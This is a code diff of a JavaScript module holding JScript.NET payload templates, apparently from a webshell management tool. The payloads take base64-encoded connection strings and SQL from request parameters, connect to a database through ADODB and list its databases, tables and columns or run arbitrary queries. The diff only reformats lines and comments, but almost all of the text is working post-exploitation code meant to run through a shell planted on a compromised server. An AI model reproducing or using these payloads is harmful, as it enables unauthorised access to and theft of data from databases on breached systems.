@@ -5,8 +5,7 @@
 module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   // 显示所有数据库
   show_databases: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       Conn.ConnectionTimeout=10;
       Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
       var Rs=new ActiveXObject("ADODB.Recordset");
@@ -17,13 +16,13 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       }
       Rs.Close();
       Conn.Close();`.replace(/\n\s+/g, ''),
-    // Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist Security Info=True;
+    // Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist
+    // Security Info=True;
     [arg1]: '#{base64::conn}'
   },
   // 显示数据库所有表
   show_tables: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));
       Conn.ConnectionTimeout=10;
       Conn.Open();
@@ -40,8 +39,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   },
   // 显示表字段
   show_columns: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       Conn.ConnectionTimeout=10;
       Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
       var Rs=new ActiveXObject("ADODB.Recordset");
@@ -61,8 +59,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   },
   // 执行SQL语句
   query: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       var strSQL:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));
       Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));
       Conn.ConnectionTimeout=10;
@@ -85,7 +82,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       }
       Conn.Close();`.replace(/\n\s+/g, ''),
     [arg1]: '#{base64::conn}',
-    // SELECT * FROM (SELECT A.*,ROWNUM N FROM table2 A ORDER BY 1) WHERE N>0 AND N<=20
+    // SELECT * FROM (SELECT A.*,ROWNUM N FROM table2 A ORDER BY 1) WHERE N>0 AND
+    // N<=20
     [arg2]: '#{base64::sql}',
     [arg3]: '#{dbname}'
   }
